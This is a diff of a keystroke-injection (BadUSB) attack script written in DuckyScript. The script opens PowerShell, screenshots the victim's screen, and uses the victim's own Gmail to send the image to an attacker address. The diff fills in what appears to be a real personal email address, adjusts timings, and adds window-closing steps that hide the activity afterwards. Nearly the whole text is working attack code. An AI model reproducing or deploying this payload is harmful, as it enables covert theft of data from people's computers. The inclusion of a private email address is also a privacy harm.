@@ -42,9 +42,10 @@ REM Disclaimer! I AM NOT LIABLE IN ANY FORM FOR HARM DONE TO A SYSTEM (even thou
 REM Giving a buffer time for script startup (this may be tweaked.)
 DELAY 5000
 
-REM Generate user proof in a box
+
+REM Generate user proof in box
 WINDOWS r
-DELAY 500 
+DELAY 500
 STRING Powershell
 DELAY 200
 ENTER
@@ -54,7 +55,7 @@ ENTER
 DELAY 500
 STRING Get-Date
 ENTER
-DELAY 500
+DELAY 1000
 
 REM Take screenshot
 SHIFT WINDOWS S
@@ -69,8 +70,9 @@ WINDOWS d
 
 REM Opens Gmail
 GUI r
-DELAY 750
-STRING chrome.exe https://mail.google.com/mail/u/0/#inbox
+DELAY 1000
+STRING chrome.exe https://mail.google.com/mail/u/0/#inbox?compose=new
+DELAY 1000
 ENTER
 
 REM the method below uses the targets email to send you the screenshot, though this may take a bit longer and require cleanup, its a bit easier to use if you know the target
@@ -83,26 +85,10 @@ REM "START USE TARGET EMAIL"
 REM use targets email for delivery (option one, require "target email cleanup" un-rem'd, adjust amount of tabs if desktop notifs popup isnt there by -3, 
 REM this part is based on the max amount of popups on gmail.)
 
-DELAY 2000
-TAB
-TAB
-TAB
-TAB
-TAB
-TAB
-TAB
-TAB
-TAB
-TAB
-TAB
-TAB
-TAB
-TAB
-TAB
-TAB
-ENTER
+REM Personal note: Currently optimised for no notification bar in bottom right.
+
 DELAY 5000
-STRING "EMAIL GOES HERE WITHOUT QUOTES"
+STRING bryce.slabaugh@gmail.com
 REM ^^^ This is the email that will recieve the screenshot ^^^
 ENTER
 DELAY 1000
@@ -120,10 +106,17 @@ REM Pastes screenshot
 SHIFT INSERT
 
 REM Waits for image to upload (adjust accoordingly)
-DELAY 30000
+DELAY 10000
 
 REM Sends email
 TAB
 ENTER
 
 REM "END USE TARGET EMAIL"
+
+REM Lets do some cleanup
+ALT F4
+DELAY 350
+ALT TAB
+DELAY 350
+ALT F4
